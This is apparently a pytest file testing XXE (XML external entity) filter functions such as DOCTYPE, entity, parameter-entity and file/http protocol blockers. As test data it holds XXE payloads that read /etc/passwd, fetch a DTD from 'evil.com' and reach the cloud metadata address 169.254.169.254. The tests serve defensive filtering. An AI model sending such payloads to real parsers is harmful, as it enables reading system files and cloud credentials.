import pytest
from xxe_ai.filters import (
    FILTERS,
    apply_filters,
    block_doctype,
    block_entity,
    block_external_entity,
    block_file_protocol,
    block_http_protocol,
    block_parameter_entity,
    disable_dtd,
    get_filter,
    register,
    strip_comments,
)

_CLASSIC = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

def test_registry_has_at_least_8_filters():
    assert len(FILTERS) >= 8

def test_block_doctype_blocks_classic():
    assert block_doctype(_CLASSIC) == ""

def test_block_doctype_passes_no_doctype():
    assert block_doctype("<root>test</root>") == "<root>test</root>"

def test_block_entity_blocks_classic():
    assert block_entity(_CLASSIC) == ""

def test_block_entity_passes_plain_xml():
    assert block_entity("<root>test</root>") == "<root>test</root>"

def test_block_external_entity_blocks_system():
    assert block_external_entity(_CLASSIC) == ""

def test_block_external_entity_passes_internal():
    internal = '<!DOCTYPE foo [<!ENTITY xxe "hello">]><foo>&xxe;</foo>'
    assert block_external_entity(internal) == internal

def test_block_parameter_entity_blocks_percent():
    pe = '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/">%dtd;]>'
    assert block_parameter_entity(pe) == ""

def test_block_parameter_entity_passes_general():
    assert block_parameter_entity(_CLASSIC) == _CLASSIC

def test_block_file_protocol_blocks_file():
    assert block_file_protocol(_CLASSIC) == ""

def test_block_file_protocol_passes_http():
    http_pl = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
    assert block_file_protocol(http_pl) == http_pl

def test_block_http_protocol_blocks_http():
    http_pl = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
    assert block_http_protocol(http_pl) == ""

def test_block_http_protocol_passes_file():
    assert block_http_protocol(_CLASSIC) == _CLASSIC

def test_strip_comments_removes_comments():
    payload = '<!-- comment --><root>test</root>'
    assert strip_comments(payload) == "<root>test</root>"

def test_strip_comments_noop_without_comments():
    assert strip_comments("<root>test</root>") == "<root>test</root>"

def test_disable_dtd_blocks_doctype():
    assert disable_dtd(_CLASSIC) == ""

def test_disable_dtd_passes_plain():
    assert disable_dtd("<root>test</root>") == "<root>test</root>"

def test_apply_filters_chains_in_order():
    out = apply_filters(_CLASSIC, ["block_file_protocol", "block_doctype"])
    assert out == ""

def test_apply_filters_empty_list_returns_input():
    assert apply_filters(_CLASSIC, []) == _CLASSIC

def test_get_filter_unknown_raises():
    with pytest.raises(KeyError):
        get_filter("does_not_exist")

def test_register_custom_filter():
    @register("my_test_filter")
    def rev(s):
        return s[::-1]
    assert get_filter("my_test_filter")("abc") == "cba"
